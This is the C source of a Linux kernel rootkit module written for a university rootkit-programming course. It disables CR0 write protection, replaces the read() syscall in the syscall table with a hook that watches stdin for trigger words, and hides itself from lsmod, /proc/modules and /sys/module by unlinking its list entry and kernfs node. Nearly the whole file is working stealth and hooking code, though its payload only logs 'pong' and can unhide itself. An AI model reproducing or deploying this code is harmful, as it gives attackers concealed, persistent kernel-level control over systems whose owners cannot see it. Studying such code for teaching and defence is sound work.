
/*******************************************************************************/
/*                                                                             */
/*   Course: Rootkit Programming                                               */
/*   Semester: WS 2015/16                                                      */
/*   Team: 105                                                                 */
/*   Assignment: 5                                                             */
/*                                                                             */
/*   Filename: module_masker.c                                                 */
/*                                                                             */
/*   Authors:                                                                  */
/*       Name: Matei Pavaluca                                                  */
/*       Email: mateipavaluca@yahoo.com                                        */
/*                                                                             */
/*       Name: Nedko Stefanov Nedkov                                           */
/*       Email: nedko.stefanov.nedkov@gmail.com                                */
/*                                                                             */
/*   Date: November 2015                                                       */
/*                                                                             */
/*   Usage: This module is hiding itself in the kernel context. Specifically,  */
/*          it does not show up in /sys/module or in the output of lsmod.      */
/*          Additionaly, it hooks the read system call and if the user types   */
/*          `ping` the rootkit responds with `pong` in the kernel log. This    */
/*          mecahnism is used to check if the rootkit is running. In order to  */
/*          unload the module, the module needs to become visible again.       */
/*          Therefore, the read system call is hooked to look for yet another  */
/*          command, called `unhide`, which makes the module visible.          */
/*                                                                             */
/*******************************************************************************/

#include <linux/module.h>		/* Needed by all kernel modules */
#include <linux/syscalls.h>		/* Needed for __NR_read */
#include <linux/list.h>			/* Needed for linked list interface */

#include "module_masker.h"
#include "sysmap.h"				/* Needed for ROOTKIT_SYS_CALL_TABLE */


MODULE_LICENSE("GPL");


/* Initialization function which is called when the module is
   insmoded into the kernel. It replaces the read() syscall. */
static int __init module_masker_start(void)
{
	module_is_hidden = heartbeat_matched_so_far = voila_matched_so_far = 0;

	disable_write_protect_mode();

	/* Store original read syscall address */
	syscall_table = (void *) ROOTKIT_SYS_CALL_TABLE;
	original_read_syscall = (void *) syscall_table[__NR_read];

	/* Overwrite manipulated read syscall */
	syscall_table[__NR_read] = (unsigned long *) my_read_syscall;

	enable_write_protect_mode();

	/* Hide module from /sys/module and lsmod */
	hide_module();

	printk(KERN_INFO "module_masker rootkit: %s\n", "successfully inserted");

	/* A non 0 return value means init_module failed; module can't be loaded */
	return 0;
}


/* Cleanup function which is called just before module
   is rmmoded. It restores the original read() syscall. */
static void __exit module_masker_end(void)
{
	disable_write_protect_mode();

	/* Restore original read syscall */
	syscall_table[__NR_read] = (unsigned long *) original_read_syscall;

	enable_write_protect_mode();

	printk(KERN_INFO "module_masker rootkit: %s\n", "successfully removed");

	return;
}


void disable_write_protect_mode(void)
{
	/* Reading contents of control register cr0. The cr0 register has various
	   control flags that modify the basic operation of the processor. */
	unsigned long original_cr0 = read_cr0();

	/* Disable `write-protect` mode. Do so by setting the WP (Write protect)
	   bit to 0. When set to 1, the CPU can't write to read-only pages */
	write_cr0(original_cr0 & ~CR0_WRITE_PROTECT_MASK);
}


void enable_write_protect_mode(void)
{
	/* Reading contents of control register cr0. The cr0 register has various
	   control flags that modify the basic operation of the processor. */
	unsigned long original_cr0 = read_cr0();

	/* Enable `write-protect` mode. Do so by setting the WP (Write protect)
	   bit to 1. When set to 1, the CPU can't write to read-only pages */
	write_cr0(original_cr0 | CR0_WRITE_PROTECT_MASK);
}


/* Function that replaces the original read syscall. In addition to what
   read syscall does, it also looks for two commands (`ping` and `unhide`).
   When `ping` is typed, it responds with `pong` in the kernel log. When
   `unhide` is typed, it makes the module visible again */
asmlinkage long my_read_syscall(unsigned int fd, char __user *buf, size_t count)
{
	long ret;
	int matches_count;
	int i;

	/* Call original read syscall */
	ret = original_read_syscall(fd, buf, count);

	/* If the read was not from STDIN don't do anything */
	if (fd != 0)
		return ret;

	/* Check if `ping` was typed */
	if ((matches_count = count_matches(buf, HEARTBEAT, &heartbeat_matched_so_far)) > 0)
		for (i=0 ; i<matches_count ; i++)
			/* Respond with `pong` in the kernel log */
			printk(KERN_INFO "module_masker rootkit: %s\n", HEARTBEAT_RESPONSE);

	/* Check if `unhide` was typed */
	if ((matches_count = count_matches(buf, VOILA, &voila_matched_so_far)) > 0) {
		printk(KERN_INFO "module_masker rootkit: visible mode on\n");
		/* Make the module visible again */
		unhide_module();
	}

	return ret;
}


/* Count matches of specified command in the user input */
int count_matches(char *buf, char *command, int *chars_matched_so_far)
{
	int matches;
	int i;

	/* Match the command */
	matches = i = 0;
	while (i < strlen(buf)) {
		if (command[(*chars_matched_so_far)++] != buf[i++])
			*chars_matched_so_far = 0;

		if (strlen(command) == *chars_matched_so_far) {
			*chars_matched_so_far = 0;
			matches++;
		}
	}

	return matches;
}


/* Hide module from /sys/module and from the output of lsmod. Do so by
   removing entries of our module from kernel data structures */
void hide_module(void)
{
	struct kernfs_node *kernfs_node_ptr;

	module_is_hidden = 1;

	/* All kernel modules are associated with a unique struct module structure. These
       structures are maintained in a global list (specifically a doubly linked list).
       Any newly created module will be added to the head of the list. The struct module
       structure of our module is found under the macro THIS_MODULE. We remove our module
       structure from the list, so it does not appear in /proc/modules and lsmod. We store
       a reference of the previous node in the list, so we can add in its correct position
       in the list when we need to make the module visible again. Keep in mind that when
       the module is absent form the list, it cannot be uninstalled. */
	module_prev = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);

	/* sysfs is a virtual file system provided by the Linux kernel. Every kernel module is
       associated with a struct kobject which represents a kernel object and shows up as
       directory in the sysfs filesystem (found under /sys/module). Kernel objects are kept
       in a memory resident data structure (specifically a red-black tree). We remove the
       kernel object associated with our module from that data structure, so it does not
       appear in /sys/module. */
	kernfs_node_ptr = THIS_MODULE->mkobj.kobj.sd;
	/* THIS_MODULE is of type: struct module - mkobj is of type: struct module_kobject -
       kobj is of type: struct kobject - sd is of type: struct kernfs_node*/
	kernfs_unlink_sibling(kernfs_node_ptr);
}


/* Unhide module from /sys/module and from the output of lsmod, so it becomes
   unloadable. Do so by re-adding entries of our module to kernel data structures */
void unhide_module(void)
{
	struct kernfs_node *kernfs_node_ptr;

	if (!module_is_hidden)
		return;

	module_is_hidden = 0;

	/* We add our module structure to the global list of loaded kernel modules, so it
       does appear in /proc/modules and lsmod. We add it to its initial position in
       the list (right after its previous node) */
	list_add(&THIS_MODULE->list, module_prev);

	/* We add the kernel object associated with our kernel module to the memory resident
       data structure of kernel objects. It will now appear in /sys/module. */
	kernfs_node_ptr = THIS_MODULE->mkobj.kobj.sd;
	kernfs_link_sibling(kernfs_node_ptr);

	/* The module is now visible in /sys/module and lsmod and can now be removed */
}


/*****************************************************************************/
/*                                                                           */
/*          CODE BELOW IS TAKEN FROM fs/kernfs/dir.c, lines 224-321          */
/*                                                                           */
/*****************************************************************************/

static int kernfs_name_compare(unsigned int hash, const char *name,
                               const void *ns, const struct kernfs_node *kn)
{
	if (hash < kn->hash)
		return -1;
	if (hash > kn->hash)
		return 1;
	if (ns < kn->ns)
		return -1;
	if (ns > kn->ns)
		return 1;
	return strcmp(name, kn->name);
}

static int kernfs_sd_compare(const struct kernfs_node *left,
                             const struct kernfs_node *right)
{
	return kernfs_name_compare(left->hash, left->name, left->ns, right);
}

/**
 *      kernfs_link_sibling - link kernfs_node into sibling rbtree
 *      @kn: kernfs_node of interest
 *
 *      Link @kn into its sibling rbtree which starts from
 *      @kn->parent->dir.children.
 *
 *      Locking:
 *      mutex_lock(kernfs_mutex)
 *
 *      RETURNS:
 *      0 on susccess -EEXIST on failure.
 */
static int kernfs_link_sibling(struct kernfs_node *kn)
{
	struct rb_node **node = &kn->parent->dir.children.rb_node;
	struct rb_node *parent = NULL;

	while (*node) {
		struct kernfs_node *pos;
		int result;

		//pos = rb_to_kn(*node);
		pos = rb_entry(*node, struct kernfs_node, rb);
		parent = *node;
		result = kernfs_sd_compare(kn, pos);
		if (result < 0)
			node = &pos->rb.rb_left;
		else if (result > 0)
			node = &pos->rb.rb_right;
		else
			return -EEXIST;
	}

	/* add new node and rebalance the tree */
	rb_link_node(&kn->rb, parent, node);
	rb_insert_color(&kn->rb, &kn->parent->dir.children);

	/* successfully added, account subdir number */
	if (kernfs_type(kn) == KERNFS_DIR)
		kn->parent->dir.subdirs++;

	return 0;
}

/**
 *      kernfs_unlink_sibling - unlink kernfs_node from sibling rbtree
 *      @kn: kernfs_node of interest
 *
 *      Try to unlink @kn from its sibling rbtree which starts from
 *      kn->parent->dir.children.  Returns %true if @kn was actually
 *      removed, %false if @kn wasn't on the rbtree.
 *
 *      Locking:
 *      mutex_lock(kernfs_mutex)
 */
static bool kernfs_unlink_sibling(struct kernfs_node *kn)
{
	if (RB_EMPTY_NODE(&kn->rb))
		return false;

	if (kernfs_type(kn) == KERNFS_DIR)
		kn->parent->dir.subdirs--;

	rb_erase(&kn->rb, &kn->parent->dir.children);
	RB_CLEAR_NODE(&kn->rb);
	return true;
}

/*****************************************************************************/

module_init(module_masker_start);
module_exit(module_masker_end);
